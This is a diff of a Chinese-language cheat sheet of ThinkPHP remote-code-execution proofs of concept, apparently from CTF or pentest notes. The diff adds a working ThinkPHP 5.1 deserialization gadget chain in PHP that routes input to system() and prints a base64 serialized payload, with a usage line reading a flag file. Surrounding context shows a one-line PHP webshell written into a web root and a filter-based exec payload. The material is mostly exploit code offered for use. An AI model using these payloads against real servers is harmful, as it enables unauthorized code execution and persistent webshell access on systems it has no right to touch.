@@ -10,7 +10,7 @@ phpMyadmin漏洞：
 
 
 ^
-## **Thinkphp POC大全**
+## **Thinkphp RCE　POC大全**
 在 Vulhub 中，也可以找到了该漏洞的利用 POC
 
 **Thinkphp 5.0.22 POC**
@@ -63,3 +63,62 @@ echo "<?php @eval(\$_POST['cmd']);?>" > /var/www/public/test.php
 
 **Thinkphp 5.1.x 和 5.2.x 和 5.0.x POC**
 35. `(post)public/index.php (data)c=exec&f=calc.exe&_method=filter`
+
+
+
+
+
+＾
+## **Tinkphp 5.1反序列化**
+?&lin=cat /flag&data=序列化串
+```
+<?php
+namespace think;
+abstract class Model{
+    protected $append = [];
+    private $data = [];
+    function __construct(){
+        $this->append = ["lin"=>["calc.exe","calc"]];
+        $this->data = ["lin"=>new Request()];
+    }
+}
+class Request
+{
+    protected $hook = [];
+    protected $filter = "system"; //PHP函数
+    protected $config = [
+        // 表单ajax伪装变量
+        'var_ajax'         => '_ajax',  
+    ];
+    function __construct(){
+        $this->filter = "system";
+        $this->config = ["var_ajax"=>'lin']; //PHP函数的参数
+        $this->hook = ["visible"=>[$this,"isAjax"]];
+    }
+}
+
+
+namespace think\process\pipes;
+
+use think\model\concern\Conversion;
+use think\model\Pivot;
+class Windows
+{
+    private $files = [];
+
+    public function __construct()
+    {
+        $this->files=[new Pivot()];
+    }
+}
+namespace think\model;
+
+use think\Model;
+
+class Pivot extends Model
+{
+}
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+?>
+```
